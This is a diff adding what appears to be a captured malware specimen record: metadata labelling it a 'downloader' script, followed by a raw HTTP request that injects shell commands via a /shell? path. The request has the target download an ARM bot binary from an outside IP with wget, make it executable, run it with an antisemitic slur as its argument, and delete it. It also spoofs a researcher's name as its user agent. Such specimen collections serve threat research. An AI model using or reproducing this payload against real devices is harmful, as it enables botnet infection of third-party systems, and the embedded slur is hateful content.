@@ -1,0 +1,18 @@
+# sha256: 052787411504345e6398653f6dc33e2009ab42e2ca8e61ac57a59e25bca2f4fa
+# family: downloader
+# kind: script
+# size_bytes: 435
+# first_seen: 2026-09-01 23:33:03.118042 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+GET /shell?cd /tmp; rm -f arm arm7; wget http://163.61.183.48/AGbot.armv7l -O arm7; chmod 777 arm7; ./arm7 jews; rm -f arm7 HTTP/1.1
+Host: 190.179.130.96:6001
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
